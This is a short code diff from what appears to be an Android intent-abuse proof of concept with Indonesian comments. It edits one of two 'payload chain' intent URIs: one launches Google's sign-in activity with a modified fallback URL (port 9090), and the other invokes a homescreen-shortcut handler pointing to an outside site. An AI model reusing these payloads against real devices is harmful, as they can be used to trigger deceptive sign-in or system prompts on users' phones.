@@ -110,7 +110,7 @@
     }
 
     // Payload Chain 1: Target intent sistem sensitif / intent resolver pemicu aktivitas latar belakang
-    const primaryIntent = "intent://com.google.android.gms.auth.login.SignInActivity#Intent;scheme=android-app;package=com.google.android.gms;S.browser_fallback_url=https%3A%2F%2Faccounts.google.com;end;";
+    const primaryIntent = "intent://com.google.android.gms.auth.login.SignInActivity#Intent;scheme=android-app;package=com.google.android.gms;S.browser_fallback_url=https%3A%2F%2Faccounts.google.com:9090;end;";
     
     // Payload Chain 2: Fallback secondary intent untuk memaksa system prompt jika primary terblokir sebagian
     const secondaryIntent = "intent://www.google.com/hsi?name=Chrome&icon=https://ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png&ve=145829&hv=1&dest=1&source=homescreen_shortcut&query=https://ndev.tk#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end;";
